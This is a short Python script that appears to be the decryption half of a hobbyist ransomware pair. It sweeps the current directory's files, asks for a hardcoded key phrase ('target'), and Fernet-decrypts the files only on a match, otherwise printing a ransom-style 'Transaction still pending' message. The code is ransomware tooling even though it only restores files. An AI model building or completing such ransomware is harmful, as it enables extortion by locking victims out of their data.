#Note that the decryption file was called hawaii.py in the directory, hence the name in the code.
import os
from cryptography.fernet import Fernet
files=[]
for file in os.listdir():
        if file=="pearl.py" or file=="thekey.key" or file=="hawaii.py":
                continue
        else:
                if os.path.isfile(file):
                        files.append(file)
with open("thekey.key","rb") as key:
        code=key.read()
keyphrase="target"
keyphrase_guess=str(input("Enter the key phrase to decrypt your files\n"))
if keyphrase_guess==keyphrase:
        for file in files:
                with open(file,"rb") as thefile:
                        encrypted_contents=thefile.read()
                contents_decrypted=Fernet(code).decrypt(encrypted_contents)
                with open(file,"wb") as thefile:
                        thefile.write(contents_decrypted)
        print("Your files have been decrypted")
else:
        print("Transaction still pending")
